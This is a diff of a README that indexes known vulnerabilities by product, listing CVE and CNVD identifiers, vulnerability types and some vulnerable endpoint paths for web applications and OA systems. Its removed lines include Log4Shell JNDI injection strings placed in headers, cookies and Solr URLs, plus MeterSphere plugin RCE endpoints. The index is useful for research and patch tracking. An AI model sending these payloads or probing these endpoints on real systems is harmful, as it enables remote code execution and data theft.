@@ -1,4 +1,10 @@
-### Java Program List
+## 漏洞索引
+[Program List](https://github.com/pen4uin/vulnerability-lab#program-list)
+> 开源产品、国外应用软件
+
+[应用列表](https://github.com/pen4uin/vulnerability-lab#%E5%BA%94%E7%94%A8%E5%88%97%E8%A1%A8)
+> 国产应用软件
+### Program List 
 - [Apache APISIX](https://github.com/pen4uin/vulnerability-lab#apache-apisix)
 - [Apache Druid](https://github.com/pen4uin/vulnerability-lab#apache-druid)
 - [Apache Flink](https://github.com/pen4uin/vulnerability-lab/#apache-flink)
@@ -15,181 +21,183 @@
 - [Atlassian Jira](https://github.com/pen4uin/vulnerability-lab/#atlassian-jira)
 - [Citrix](https://github.com/pen4uin/vulnerability-lab/#citrix)
 - [Cisco](https://github.com/pen4uin/vulnerability-lab#cisco)
-- [Coremail](https://github.com/pen4uin/vulnerability-lab/#coremail)
 - [D-Link](https://github.com/pen4uin/vulnerability-lab/#d-link)
 - [ECShop](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#ecshop)
-- [Eyou-亿邮](https://github.com/pen4uin/vulnerability-lab/#eyou-%E4%BA%BF%E9%82%AE)
 - [Exchange](https://github.com/pen4uin/vulnerability-lab/#exchange)
 - [F5 BIG-IP](https://github.com/pen4uin/vulnerability-lab/#f5-big-ip)
-- [FineReport-帆软](https://github.com/pen4uin/vulnerability-lab/#finereport-%E5%B8%86%E8%BD%AF)
 - [Gitlab](https://github.com/pen4uin/vulnerability-lab/#gitlab)
 - [Grafana](https://github.com/pen4uin/vulnerability-lab/#grafana)
 - [Harbor](https://github.com/pen4uin/vulnerability-lab/#harbor)
 - [H2Database](https://github.com/pen4uin/vulnerability-lab/#h2database)
 - [H3C](https://github.com/pen4uin/vulnerability-lab/#h3c)
-- [K-金蝶](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#k-%E9%87%91%E8%9D%B6)
 - [Lanproxy](https://github.com/pen4uin/vulnerability-lab/#lanproxy)
 - [Laravel](https://github.com/pen4uin/vulnerability-lab/#laravel)
 - [Linux](https://github.com/pen4uin/vulnerability-lab/#linux)
-- [Live800](https://github.com/pen4uin/vulnerability-lab/#live800)
 - [Moodle](https://github.com/pen4uin/vulnerability-lab/#moodle)
 - [MeterSphere](https://github.com/pen4uin/vulnerability-lab/#metersphere)
 - [Jboss](https://github.com/pen4uin/vulnerability-lab/#jboss)
 - [Jellyfin](https://github.com/pen4uin/vulnerability-lab/#jellyfin)
 - [Jetty](https://github.com/pen4uin/vulnerability-lab/#jetty)
-- [J-金山终端安全系统](https://github.com/pen4uin/vulnerability-lab#j-%E9%87%91%E5%B1%B1%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F)
-- [OA-金和](https://github.com/pen4uin/vulnerability-lab/#oa-%E9%87%91%E5%92%8C)
-- [OA-蓝凌](https://github.com/pen4uin/vulnerability-lab/#oa-%E8%93%9D%E5%87%8C)
-- [OA-泛微](https://github.com/pen4uin/vulnerability-lab/#oa-weaver-%E6%B3%9B%E5%BE%AE)
-- [OA-然之协同](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#oa-%E7%84%B6%E4%B9%8B%E5%8D%8F%E5%90%8C)
-- [OA-致远](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#oa-%E8%87%B4%E8%BF%9C)
-- [OA-通达](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#oa-%E9%80%9A%E8%BE%BE)
-- [OA-万户](https://github.com/pen4uin/vulnerability-lab#oa-%E4%B8%87%E6%88%B7)
-- [OA-信呼](https://github.com/pen4uin/vulnerability-lab#oa-%E4%BF%A1%E5%91%BC)
-- [Phpstudy](https://github.com/pen4uin/vulnerability-lab/#phpstudy)
-- [Q-齐治堡垒机](https://github.com/pen4uin/vulnerability-lab/#q-%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA)
-- [Ruijie-锐捷](https://github.com/pen4uin/vulnerability-lab/#ruijie-%E9%94%90%E6%8D%B7)
-- [RuoYi-偌依](https://github.com/pen4uin/vulnerability-lab#ruoyi-%E5%81%8C%E4%BE%9D)
-- [SpiderFlow](https://github.com/pen4uin/vulnerability-lab#spiderflow)
 - [Spring](https://github.com/pen4uin/vulnerability-lab/#spring)
 - [Thinkadmin](https://github.com/pen4uin/vulnerability-lab/#thinkadmin)
 - [ThinkPHP3](https://github.com/pen4uin/vulnerability-lab/blob/main/README.md#thinkphp-3x)
-- [T-360天擎](https://github.com/pen4uin/vulnerability-lab/#t-360%E5%A4%A9%E6%93%8E)
 - [Typecho](https://github.com/pen4uin/vulnerability-lab/#typecho)
 - [VMware](https://github.com/pen4uin/vulnerability-lab/#vmware)
 - [Weblogic](https://github.com/pen4uin/vulnerability-lab/#weblogic)
-- [Yonyou-用友](https://github.com/pen4uin/vulnerability-lab/#yonyou-%E7%94%A8%E5%8F%8B)
+
+#### Apache Airflow
+- CVE-2020-11978 Apache Airflow 命令注入
 
 #### Apache APISIX
 - CVE-2021-45232 Apache APISIX Dashboard Pre-Auth RCE
-  - 📌 [apisix_dashboard_rce](https://github.com/wuppp/apisix_dashboard_rce)
+- CVE-2021-43557 Apache APISIX Path traversal
+
+#### Apache Axis
+- CVE-2019-0227 Apache Axis 1.4 RCE
+
+#### Apache Cocoon
+- CVE-2020-11991 Apache Cocoon  XXE
 
 #### Apache Druid
-- [Apache Druid RCE via Log4shell](https://github.com/pen4uin/JavaSec/tree/main/apache%20druid)
+- CVE-2021-44228 Apache Druid RCE via Log4shell
+- CVE-2021-36749 Apache Druid 文件读取
+- CVE-2020-9496  Apache Druid 代码执行
+- CVE-2021-25646 Apache Druid 代码执行
+
+#### Apache Dubbo
+- CVE-2019-17564 Apache Dubbo 反序列化 RCE
+- CVE-2020-1948  Apache DubboHessian 反序列化
 
 #### Apache Flink
-- CVE-2020-17518(Apache Flink 目录遍历/文件写入漏洞-Upload) `2021-01`
-- CVE-2020-17519(Apache Flink 目录遍历/文件读取漏洞-jobmanager/logs)b`2021-01`
-- CVE-2021-44228(Apache Flink RCE via Log4shell)
+- CVE-2020-17518 Apache Flink 目录遍历/文件写入-Upload)
+- CVE-2020-17519 Apache Flink 目录遍历/文件读取-jobmanager/logs)
+- CVE-2021-44228 Apache Flink RCE via Log4shell
+
+#### Apache Log4j
+- CVE-2017-5645 Log4j 2.x 反序列化
+- CVE-2019-17571 Log4j 1.2.x 反序列化
+- CVE-2021-44228 Log4j JNDI
+
 #### Apache HTTP Server
-- CVE-2021-41773(Apache HTTP Server Path Traversal and Remote Code Execution)
-- CVE-2021-42013(Apache HTTP Server Path Traversal and Remote Code Execution)
+- CVE-2021-41773 Apache HTTP Server Path Traversal/RCE
+- CVE-2021-42013 Apache HTTP Server Path Traversal/RCE
+
+#### Apache JMeter
+- CVE-2018-1297 Apache JMeter RMI 反序列化
 
 #### Apache JSPWiki
 - CVE-2021-44140 Apache JSPWiki Arbitrary file deletion on logout
-- Apache JSPWiki RCE via Log4shell
-    ```shell
-    http://0.0.0.0:8080/Edit.jsp?page=Main
-    X-Forwarded-For:${jndi:dns://0.0.0.0/123}
-    ```
+- CVE-2021-44228 Apache JSPWiki RCE via Log4shell
+
 #### Apache OFBiz
-- CVE-2020-9496 Apache Ofbiz 远程代码执行漏洞
-- CVE-2021-26295 Apache OFBiz 远程代码执行漏洞
-- Apache OFBiz RCE via Log4shell
-    ```shell
-    # 1、
-    GET: https://0.0.0.0:8443/webtools/control/main
-    Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
-    # 2、
-    POST: https://0.0.0.0:8443/webtools/control/setLocaleFromBrowser
-    Content-Type: text/html;charset=UTF-8${jndi:ldap://0.0.0.0/123}
-    ```
+- CVE-2020-9496  Apache Ofbiz 反序列化
+- CVE-2021-26295 Apache OFBiz 反序列化
+- CVE-2021-44228 Apache OFBiz RCE via Log4shell
 
 #### Apache ShenYu
-- CVE-2021-37580 Apache ShenYu 身份验证绕过漏洞
+- CVE-2021-37580 Apache ShenYu 权限绕过
+
+#### Apache Shiro
+- CVE-2016-4437	  反序列化-RememberMe 
+- CVE-2016-6802	  身份认证绕过
+- CVE-2019-12422	
+- CVE-2020-1957	  身份认证绕过
+- CVE-2020-11989  身份认证绕过
+- CVE-2020-13933	身份认证绕过
+- CVE-2020-17510	身份认证绕过
+- CVE-2020-17523	身份认证绕过
+- CVE-2021-41303	身份认证绕过
 
 #### Apache SkyWalking
-- Apache SkyWalking RCE via Log4shell
-    
+- CVE-2021-44228 Apache SkyWalking RCE via Log4shell
+- CVE-2020-9483 Apache Skywalking SQL注入
+- CVE-2020-13921 Apache Skywalking SQL注入    
+
 #### Apache Solr
-- Apache Solr RCE via Log4shell 
-    ```shell
-    /solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://0.0.0.0/123%7D&wt=json
-    /solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
-    /solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=
-    ```
+- CVE-2021-44228 Apache Solr RCE via Log4shell 
+
 #### Apache Storm
-- CVE-2021-38294 Apache Storm 反序列化漏洞
-- CVE-2021-40865 Apache Storm 命令注入漏洞
+- CVE-2021-38294 Apache Storm 反序列化
+- CVE-2021-40865 Apache Storm 命令注入
 
 #### Apache Struts2
-- [Apache Struts2 RCE via Log4Shell](https://github.com/pen4uin/JavaSec/tree/main/struts2)
+- CVE-2021-44228 Apache Struts2 RCE via Log4Shell
 
 #### Atlassian Confluence
-- CVE-2019-3396 Atlassian Confluence 路径穿越漏洞
-- CVE-2021-26084 Atlassian Confluence OGNL 注入漏洞-可回显)
-- CVE-2021-26085 Atlassian Confluence任意文件读取漏洞（受限）
+- CVE-2019-3394  Atlassian Confluence 文件读取
+- CVE-2019-3395  Atlassian Confluence SSRF
+- CVE-2019-3396  Atlassian Confluence 路径穿越/代码执行
+- CVE-2020-4027  Atlassian Confluence SSTI
+- CVE-2021-26084 Atlassian Confluence OGNL注入
+- CVE-2021-26085 Atlassian Confluence 文件读取
 
 #### Atlassian Crowd
 - CVE-2019-11580 Atlassian Crowd RCE
 
 #### Atlassian Jira
-- CVE-2021-26086 (Jira 文件读取漏洞)
-- CVE-2020-29453 (Jira 文件读取漏洞)
-- CVE-2020-14181 (Jira 用户名枚举漏洞)
-- CVE-2019-8451 (Jira 未授权SSRF漏洞)
-- CVE-2019-8442 (Jira 未授权+信息泄露漏洞)
-- CVE-2019-3402 (Jira 反射型XSS漏洞)
-- CVE-2019-8444 (Jira  存储型XSS漏洞)
-- CVE-2017-9506 (Jira URL跳转漏洞)
+- CVE-2017-9506  Jira URL跳转
+- CVE-2019-8451  Jira SSRF
+- CVE-2019-8442  Jira 未授权/信息泄露
+- CVE-2019-3402  Jira XSS
+- CVE-2019-8444  Jira  XSS
+- CVE-2019-11581 Jira SSTI
+- CVE-2020-29453 Jira 文件读取
+- CVE-2020-14181 Jira 用户名枚举
+- CVE-2021-26086 Jira 文件读取
+- CVE-2021-39115 Jira SSTI
 
 #### Citrix
-- CVE-2020-8209(Citrix XenMobile 目录遍历/任意文件读取漏洞)
-- Citrix XenMobile RCE via Log4shell
+- CVE-2020-8209 Citrix  XenMobile 目录遍历/文件读取
+- CVE-2021-44228 Citrix XenMobile RCE via Log4shell
 
 #### Cisco
-- CVE-2020-3452(Cisco ASAFTD任意文件读取漏洞)
+- CVE-2020-3452 Cisco ASAFTD 任意文件读取
 
 #### Coremail
-- Coremail 任意用户密码修改漏洞 
+- Coremail 任意用户密码修改
 
 #### D-Link
-- CVE-2020-25078(D-Link DCS-2530L 敏感信息泄露漏洞) `2021-04`
-- CVE-2018-6530(D-Link 远程命令执行漏洞)
-- CVE-2019-7297(D-Link DIR-823G 命令注入漏洞)
-- CVE-2019-7298(D-Link DIR-823G 命令注入漏洞)
-- CVE-2019-13128(D-Link DIR-823G 命令注入漏洞)
-- CVE-2019-15529(D-Link DIR-823G 命令注入漏洞)
-- CVE-2019-17621(D-Link DIR-859 远程代码执行漏洞)
-- CNVD-2018-01084(D-Link DIR-615/645/815 命令注入漏洞)
-- CVE-2018-17063(D-Link DIR-816 A2 命令注入漏洞)
-- CVE-2020-24581(D-link DSL-2888A 远程代码执行)
+- CVE-2020-25078  D-Link DCS-2530L 信息泄露
+- CVE-2018-6530   D-Link 远程命令执行
+- CVE-2019-7297   D-Link DIR-823G 命令注入
+- CVE-2019-7298   D-Link DIR-823G 命令注入
+- CVE-2019-13128  D-Link DIR-823G 命令注入
+- CVE-2019-15529  D-Link DIR-823G 命令注入
+- CVE-2019-17621  D-Link DIR-859 远程代码执行
+- CNVD-2018-01084 D-Link DIR-615/645/815 命令注入
+- CVE-2018-17063  D-Link DIR-816 A2 命令注入
+- CVE-2020-24581  D-link DSL-2888A 远程代码执行
+
+#### Django
+- CVE-2021-35042 Django SQL注入
+
+#### Docker
+- CVE-2020-15257 Docker 容器逃逸
 
 #### ECShop
-- ECShop v2.x/3.x 远程代码执行漏洞
-- ECShop v3.0 SQL注入漏洞-flow.php 
-- ECShop v2.6.1 SQL注入漏洞-uc.php
-- ECShop v4.1.0 SQL注入漏洞-/ecshop/delete_cart_goods.php
-- ECShop v2.7.3 SQL注入漏洞(CVE-2021-43679)
-
-#### Eyou-亿邮
-- 亿邮 远程命令执行漏洞-/webadm/?q=moni_detail.do&action=gragh
+- CVE-20xx-xxxxx ECShop v2.x/3.x 远程代码执行
+- CVE-20xx-xxxxx ECShop v3.0 SQL注入-flow.php 
+- CVE-20xx-xxxxx ECShop v2.6.1 SQL注入-uc.php
+- CVE-20xx-xxxxx ECShop v4.1.0 SQL注入-/ecshop/delete_cart_goods.php
+- CVE-2021-43679 ECShop v2.7.3 SQL注入
 
 #### Exchange
-- CVE-2021-26855(Exchange SSRF漏洞)
-- ProxyLogon (CVE-2021-26855 + CVE-2021-27065)
-- ProxyOracle (CVE-2021-31195 + CVE-2021-31196)
-- ProxyShell (CVE-2021-34473 + CVE-2021-34523  + CVE-2021-31207)
+- CVE-2021-26855 + CVE-2021-27065 ProxyLogon
+- CVE-2021-31195 + CVE-2021-31196 ProxyOracle 
+- CVE-2021-34473 + CVE-2021-34523  + CVE-2021-31207 ProxyShell
 - CVE-2021-41349 Exchange XSS
 
-
 #### F5 BIG-IP
-- CVE-2020-5902(F5 BIG-IP远程代码执行漏洞) `2021-01`
-- CVE-2021-22986(F5 BIG-IP远程代码执行漏洞) `2021-03`
-
-#### FineReport-帆软
-- 帆软报表 2012 信息泄露漏洞 `2021-05`
-- 帆软报表 回显SSRF/任意文件读取漏洞 `2021-05` 
-- 帆软报表 v8 任意文件读取漏洞(CNVD-2018-04757) `2021-05` 
-- 帆软报表 v8 目录遍历漏洞 `2021-08`
-- 帆软报表 v9 任意文件上传(非覆盖-CNVD-2021-34467) `2021-05`
+- CVE-2020-5902  F5 BIG-IP 远程代码执行 `2021-01`
+- CVE-2021-22986 F5 BIG-IP 远程代码执行 `2021-03`
 
 #### Gitlab
-- Gitlab CI Lint API未授权 SSRF漏洞(CVE-2021-22214)
+- CVE-2021-22214 Gitlab CI Lint API SSRF
+- CVE-2021-22205 Gitlab RCE
+
 
 #### Grafana
-- Grafana 未授权任意文件读取漏洞-/public/plugins/grafana-clock-panel/
-
+- CVE-2021-xxxx Grafana 文件读取-/public/plugins/grafana-clock-panel/
 
 #### Harbor
 - CVE-2019-16097 任意管理员注册
@@ -197,253 +205,261 @@
 #### H2Database
 - CVE-2021-42392 H2 Database Console JNDI Injection
 
-#### H3C
-- H3C IMC dynamiccontent.properties.xhtm 远程命令执行漏洞 `2021-05`
-- H3C 下一代防火墙任意文件读取漏洞 `2021-05`
-- H3C SecPath 运维审计系统 任意用户登录漏洞 `2021-05`
-
-
-#### K-金蝶
-- 金蝶EAS server_file 目录遍历漏洞
-
-
 #### Lanproxy
-- CVE-2020-3019 (lanproxy 目录遍历/文件读取) 
+- CVE-2020-3019 Lanproxy 目录遍历/文件读取
 
 #### Laravel
-- CVE-2021-3129(Laravel Debug RCE) 
-#### Linux
-- [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156) 提权
-- [CVE-2021-4034](https://github.com/arthepsy/CVE-2021-4034) 提权
+- CVE-2018-15133 RCE
+- CVE-2021-3129  Laravel Debug RCE 
 
-#### Live800
-- Live800 downloadserver 文件下载
+#### Linux
+- CVE-2021-3156 Linux 本地提权
+- CVE-2021-4034 Linux 本地提权
+
 #### Moodle
-- [CVE-2022-0332 SQL injection](https://github.com/numanturle/CVE-2022-0332)
+- CVE-2022-0332 Moodle SQL injection
+
+#### Metabase
+- CVE-2021-41277 Metabase文件读取
+
 #### MeterSphere
 - CVE-2021-45789 MeterSphere Post-auth 文件读取
-     ```shell
-     /api/automation/file/download
-     ```
 - CVE-2021-45790 MeterSphere Pre-auth 文件上传
-     ```shell
-     /resource/md/upload
-     ```
-- MeterSphere Plugin Pre-auth RCE
-     ```
-     # 上传jar包注册恶意类
-     /plugin/add
-     # 调用类中的customMethod函数、rce
-     /plugin/customMethod
-     ```
+- CVE-2021-xxxxx MeterSphere Plugin Pre-auth RCE
 
 #### Jboss
 - CVE-2006-5750
 - CVE-2007-1036
 - CVE-2010-0738
-- CVE-2010-1871(JBoss Seam Framework远程代码执行漏洞)
-- CVE-2015-7501(JBoss JMXInvokerServlet 反序列化漏洞) `2021-01`
+- CVE-2010-1871  JBoss Seam Framework远程代码执行 
+- CVE-2015-7501  JBoss JMXInvokerServlet 反序列化 
 - CVE-2013-4810
-- CVE-2017-7504(JBoss 4.x JBossMQ JMS 反序列化漏洞) `2021-01`
-- CVE-2017-12149(JBOSS AS 5.x/6.x反序列化命令执行漏洞) `2021-01`
-- CVE-xxxx-xxxxx(JBoss jmx-consoleHtmlAdaptor addURL() 文件上传漏洞)
+- CVE-2017-7504  JBoss 4.x JBossMQ JMS 反序列化 
+- CVE-2017-12149 JBOSS AS 5.x/6.x 反序列化
 
 #### Jellyfin
-- Jellyfin 任意文件读取漏洞(CVE-2021-21402) `2021-05`
+- CVE-2021-21402 Jellyfin 文件读取
 
 #### Jetty
-- Jetty URI路径限制绕过漏洞（CVE-2021-28169）
-- Jetty URI路径限制绕过漏洞（CVE-2021-28164）
-
-#### J-金山终端安全系统
-- 金山终端安全管理系统 v8 任意文件上传漏洞-upload.php 
-- 金山终端安全管理系统 v8 任意文件读取漏洞-downfile.php 
-- 金山终端安全管理系统 v8 命令执行漏洞-pdf_maker.php
-
-#### OA-金和
-- 金和OA C6 管理员默认口令 `2021-05` 
-- 金和OA C6 download.asp 任意文件下载漏洞 `2021-07`
+- CVE-2021-28169 Jetty URI路径限制绕过
+- CVE-2021-28164 Jetty URI路径限制绕过
 
 
-#### OA-蓝凌
-- CNVD-2021-01363(蓝凌OA EKP 后台SQL注入漏洞) `2021-04`
-- 蓝凌OA custom.jsp SSRF/任意文件读取漏洞 `2021-05`
-- 蓝凌OA 远程命令执行漏洞(SSRF+XMLDecoder=RCE) `2021-05`
-- 蓝凌OA 远程命令执行漏洞(SSRF+JNDI=RCE) `2021-05`
-- CNVD-2020-62240(蓝凌OA SQL注入漏洞-/admin/list/list.aspx) `2021-07`
+#### Spring
+- CVE-xxxx-xxxx  SpringBoot Actuator 未授权访问
+- CVE-2018-1271  Spring MVC Directory Traversal
+- CVE-2019-3799  Spring Cloud Config Server Directory Traversal/文件读取
+- CVE-2020-5405  Spring Cloud Config Server Directory Traversal
+- CVE-2020-5410  Spring Cloud Config Directory Traversal
+- CVE-2020-5412  Spring Cloud Netflix Hystrix Dashboard SSRF
+- CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal
 
-#### OA-Weaver-泛微
-- 📌 [weaver_exp](https://github.com/z1un/weaver_exp)
-- wooyun-2016-0191882(泛微OA SQL注入漏洞-HrmResourceContactEdit.jsp)
-- wooyun-2016-0178866(泛微OA 某接口任意SQL命令执行漏洞)
-- wooyun-2016-0169872(泛微OA 任意文件遍历&操作漏洞)
-- wooyun-2016-0198158(泛微OA SQL注入漏洞)
-- wooyun-2016-0198158(泛微OA 任意文件读取漏洞)
-- wooyun-2016-0169453(泛微OA SOAP注入漏洞)
-- wooyun-2016-0215533(泛微OA 数据库任意操作漏洞-xp_cmdshell)
-- CNVD-2017-03561(泛微e-mobile login.do表达式注入漏洞)
-- CNVD-2019-29900(泛微OA 任意文件下载漏洞)
-- CNVD-2019-29902(泛微OA 任意文件读取漏洞)
-- CNVD-2019-32204(泛微OA 远程命令执行漏洞)
-- CNVD-2019-34241(泛微OA 前台SQL注入漏洞-WorkflowCenterTreeData.jsp)
-- CNVD-2019-40989(泛微OA SQL注入漏洞-SyncUserInfo.jsp)
-- CNVD-2019-40989(泛微OA SQL注入漏洞-WorkflowCenterTreeData.jsp)
-- CNVD-2019-41610(泛微OA SQL注入漏洞-validate.jsp)
-- CNVD-2020-59520(泛微e-bridge 目录遍历/任意文件读取漏洞)
-- CNVD-xxxx-xxxxx(泛微OA 数据库配置信息泄露漏洞-DBconfigReader.jsp)
-- CNVD-xxxx-xxxxx(泛微OA 日志信息泄露漏洞-gethrmkq.jsp) 
-- 泛微 OA SSRF漏洞 
-- 泛微 Eoffice 数据库配置信息泄露漏洞-mysql_config.ini 
-- 泛微 OA 前台SQL注入漏洞-/js/hrm/getdata.jsp  
-- 泛微 e-mobile6.6 前台RCE 
-- 泛微 OA 任意文件上传漏洞-sysinterface/codeEdit.jsp 
-- 泛微 OA V9 uploadOperation.jsp 文件上传漏洞 
-- 泛微 OA WorkflowServiceXml 绕过访问限制漏洞(RCE) 
-- 泛微 OA 任意文件上传漏洞-cloudstore 
-- 泛微 OA v8 任意文件下载漏洞 
-- 泛微 OA 任意文件上传漏洞-KtreeUploadAction 
-- 泛微 OA 任意文件上传漏洞-ExcelUploadServlet 
-- 泛微 Eoffice v10 SQL注入漏洞-leave_record.php
-- CNVD-2021-49104 泛微 Eoffice v9 文件上传漏洞-UploadFile.php
+#### Typecho
+- CVE-xxxx-xxxxx Typecho v1.0 SSRF
+- CVE-2018-18753 Typecho v1.1 反序列化
 
-#### OA-然之协同
+#### ThinkPHP 3.x
+- ThinkPHP3.2.x 文件包含->RCE
+
+#### Thinkadmin
+- CVE-2020-25540 目录遍历/文件读取
+- CNVD-2020-33163
+
+#### VMware
+- CVE-2021-21972 VMware vCenter 远程命令执行
+- CVE-2021-21975 VMware vRealize Operations Manager SSRF
+- CVE-2021-21985 VMware vCenter 远程代码执行
+- CVE-2021-xxxxx VMware vCenter 文件读取-/eam/vib?id=
+- CVE-2021-22005 VMware vCenter Server 文件上传
+- CVE-2021-xxxxx VMware vCenter SSRF/文件读取-/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=
+- CVE-2021-21978 VMware View Planner 远程代码执行
+- CVE-2021-44228 VMware Product RCE via Log4Shell 
+- CVE-2021-21973 VMware vCenter SSRF
+
+#### Weblogic
+- CVE-2020-14882+CVE-2020-14883 Weblogic 权限绕过+ 命令执行 = RCE
+- CVE-2020-14750 Weblogic 权限绕过
+- CVE-2022-21350 Weblogic 反序列化
+
+___
+### 应用列表
+- [亿邮]()
+- [帆软]()
+- [新华三]()
+- [金蝶]()
+- [金山终端安全系统]()
+- [金和OA]()
+- [泛微OA]()
+- [然之协同OA]()
+- [致远OA]()
+- [万户OA]()
+- [信呼OA]()
+- [九思OA]()
+- [通达OA]()
+- [齐治堡垒机]()
+- [锐捷]()
+- [若依]()
+- [天擎]()
+- [用友]()
+- [深信服]()
+- [亿赛通]()
+#### 亿邮
+- 亿邮 远程命令执行(CNVD-2021-26422)-/webadm/?q=moni_detail.do&action=gragh
+
+#### 帆软
+- 帆软报表 2012 信息泄露  `2021-05`
+- 帆软报表 SSRF/文件读取  `2021-05` 
+- 帆软报表 v8 文件读取 (CNVD-2018-04757) `2021-05` 
+- 帆软报表 v8 目录遍历 `2021-08`
+- 帆软报表 v9 文件上传(CNVD-2021-34467) `2021-05`
+
+#### 新华三
+- H3C IMC dynamiccontent.properties.xhtm 远程命令执行 `2021-05`
+- H3C 下一代防火墙任意文件读取 `2021-05`
+- H3C SecPath 运维审计系统 任意用户登录 `2021-05`
+
+#### 金蝶
+- 金蝶EAS server_file 目录遍历
+
+#### 金山终端安全系统
+
+- 金山终端安全管理系统 v8 文件上传-upload.php 
+- 金山终端安全管理系统 v8 文件读取-downfile.php 
+- 金山终端安全管理系统 v8 命令执行-pdf_maker.php
+
+#### 金和OA
+- 金和OA C6 管理员默认口令
+- 金和OA C6 download.asp 文件下载
+
+#### 蓝凌OA
+- 蓝凌OA EKP 后台SQL注入(CNVD-2021-01363) 
+- 蓝凌OA SSRF/文件读取-custom.jsp  
+- 蓝凌OA SSRF+XMLDecoder=RCE  
+- 蓝凌OA SSRF+JNDI=RCE 
+- 蓝凌OA SQL注入(CNVD-2020-62240)-/admin/list/list.aspx 
+
+#### 泛微OA
+- 泛微e-mobile 表达式注入(CNVD-2017-03561)-login.do
+- 泛微OA 文件下载(CNVD-2019-29900)
+- 泛微OA 文件读取(CNVD-2019-29902)
+- 泛微OA 远程命令执行(CNVD-2019-32204)
+- 泛微OA SQL注入(CNVD-2019-34241)-WorkflowCenterTreeData.jsp
+- 泛微OA SQL注入(CNVD-2019-40989)-SyncUserInfo.jsp
+- 泛微OA SQL注入(CNVD-2019-40989)-WorkflowCenterTreeData.jsp
+- 泛微OA SQL注入(CNVD-2019-41610)-validate.jsp
+- 泛微e-bridge 目录遍历/文件读取(CNVD-2020-59520)
+- 泛微OA 信息泄露-DBconfigReader.jsp
+- 泛微OA 信息泄露-gethrmkq.jsp
+- 泛微OA SSRF
+- 泛微Eoffice 信息泄露-mysql_config.ini 
+- 泛微OA SQL注入-/js/hrm/getdata.jsp  
+- 泛微e-mobile6.6 RCE 
+- 泛微OA 文件上传-sysinterface/codeEdit.jsp 
+- 泛微OA V9 文件上传-uploadOperation.jsp  
+- 泛微OA XStream反序列化
+- 泛微OA 文件上传-cloudstore 
+- 泛微OA v8 文件下载 
+- 泛微OA 文件上传-KtreeUploadAction 
+- 泛微OA 文件上传-ExcelUploadServlet 
+- 泛微Eoffice v10 SQL注入-leave_record.php
+- 泛微Eoffice v9 文件上传(CNVD-2021-49104)-UploadFile.php
+
+#### 然之协同OA
 - 然之协同系统 v4.6.1 SQL注入
 - 然之协同系统 v4.6.1 SQL注入->文件删除
 - 然之协同系统 v4.6.1 SQL注入->文件下载
 - 然之协同系统 v4.6.1 SQL注入-文件删除->RCE
 - 然之协同系统 v4.6.1 喧喧聊天系统 RCE
 
-#### OA-致远
-- 📌 [seeyou_exp](https://github.com/z1un/seeyou_exp)
-- 致远OA Session泄露漏洞-/yyoa/ext/https/getSessionList.jsp
-- 致远OA 帆软报表组件 前台XXE漏洞
-- 致远OA 帆软报表v8.0 后台文件上传漏洞
-- 致远OA A6 信息泄露漏洞-createMysql
-- 致远OA A6 信息泄露漏洞-DownExcelBeanServlet
-- 致远OA A6 信息泄露漏洞-initDataAssess
-- 致远OA A6 setextno.jsp SQL注入漏洞
-- 致远OA A6 test.jsp SQL注入漏洞
-- 致远OA A6 search_result.jsp SQL注入漏洞
-- 致远OA A6 webmail.do 任意文件下载漏洞
-- 致远OA A8 任意用户密码修改漏洞
-- 致远OA A8 用户名&密码枚举漏洞-/seeyon/getAjaxDataServlet
-- 致远OA A8 任意文件读取漏洞-/seeyon/management/status.jsp
-- 致远OA A8 远程代码执行漏洞-htmlofficeservlet
-- 致远OA ajax.do 未授权访问+任意文件上传漏洞
-- 致远OA Cookie泄露+任意文件上传漏洞
-- 致远OA Fastjson 反序列化漏洞
+#### 致远OA
+- 致远OA Session泄露-/yyoa/ext/https/getSessionList.jsp
+- 致远OA 帆软报表组件 XXE
+- 致远OA 帆软报表v8.0 后台文件上传
+- 致远OA A6 信息泄露-createMysql
+- 致远OA A6 信息泄露-DownExcelBeanServlet
+- 致远OA A6 信息泄露-initDataAssess
+- 致远OA A6 SQL注入-setextno.jsp
+- 致远OA A6 SQL注入-test.jsp 
+- 致远OA A6 SQL注入-search_result.jsp
+- 致远OA A6 文件下载-webmail.do
+- 致远OA A8 用户密码修改
+- 致远OA A8 用户名&密码枚举-/seeyon/getAjaxDataServlet
+- 致远OA A8 文件读取-/seeyon/management/status.jsp
+- 致远OA A8 远程代码执行-htmlofficeservlet
+- 致远OA 未授权访问+文件上传-ajax.do 
+- 致远OA Cookie泄露+文件上传
+- 致远OA Fastjson 反序列化
 
+#### 万户OA
+- 万户OA 文件上传-/defaultroot/upload/fileUpload.controller
+- 万户OA 文件上传-/defaultroot/officeserverservlet
 
-#### OA-通达
-- 📌 [TongdaOA-exp](https://github.com/z1un/TongdaOA-exp)
-- 通达OA v11.9 前台SQL注入-get_datas.php
-
-#### OA-万户
-- 万户OA文件上传漏洞-/defaultroot/upload/fileUpload.controller
-- 万户OA文件上传漏洞-/defaultroot/officeserverservlet
-
-#### OA-信呼
-- 信呼OA v2.1.7 后台SQL注入漏洞-typeid
+#### 信呼OA
+- 信呼OA v2.1.7 后台SQL注入-typeid
 - 信呼OA v2.2.8 后台文件操作->RCE
 - 信呼OA v2.2.8 后台SQL注入->RCE
 - 信呼OA v2.3.0 后台配置文件->RCE
 
-#### Phpstudy
-- phpstudy backdoor
+#### 九思OA
+- 九思OA 文件读取-/GetRawFile
 
-#### Q-齐治堡垒机
-- 齐治堡垒机任意用户登录漏洞 `2021-05`
+#### 齐治堡垒机
+- 齐治堡垒机 任意用户登录 
 
+#### 锐捷
+- 锐捷EWEB网管系统 命令注入-/guest_auth/guestIsUp.php
+- 锐捷统一上网行为管理审计系统 信息泄露(CNVD-2021-14536)
+- 锐捷EG易网关 远程命令执行-branch_passw.php 
